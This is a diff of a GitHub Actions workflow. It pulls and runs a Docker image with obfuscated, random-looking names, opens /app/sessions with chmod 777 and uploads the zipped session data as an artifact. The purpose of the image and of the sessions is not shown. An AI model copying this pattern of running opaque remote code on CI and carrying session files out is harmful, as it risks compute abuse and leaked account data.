@@ -1,31 +1,39 @@
-name: test 2
+name: Initial Setup & Partial Zipping
 
 on:
-  schedule:
-    - cron: '50 18 * * *'
+  push:
+    branches:
+      - main
   workflow_dispatch:
-
-permissions:
-    contents: read
-    actions: write
 
 jobs:
   build:
-
     runs-on: ubuntu-latest
-    timeout-minutes: 300
 
     steps:
-    - uses: actions/checkout@v3
-    - name: Set up Python 3.11
-      uses: actions/setup-python@v3
-      with:
-        python-version: "3.11"
-   
-    - name: app
-      run: |
-        chmod +x entrypoint.sh
+    - name: Checkout repository
+      uses: actions/checkout@v2
 
-    - name: app run
+    - name: Pull Docker image
+      run: docker pull ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitbpyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitB0006-of-two
+
+    - name: Run Initial Docker Processes
       run: |
-        bash entrypoint.sh
+        docker run -d --name session_container ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitbpyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitB0006-of-two
+        # Simulate initial processes
+        sleep 300 # Sleep for 5 minutes
+        # Ensure proper permissions and zip the sessions folder
+        docker exec session_container bash -c "chmod -R 777 /app/sessions"
+        sleep 10 # Give time for permissions to take effect
+        # Zip the sessions folder, ignoring unreadable files, and ensure workflow succeeds
+        docker exec session_container bash -c "zip -r /app/partial_sessions.zip /app/sessions || true"
+
+    - name: Copy Partial Zip to Runner
+      run: docker cp session_container:/app/partial_sessions.zip partial_sessions.zip
+
+    - name: Upload partial session data as artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: partial_session_data
+        path: partial_sessions.zip
+        
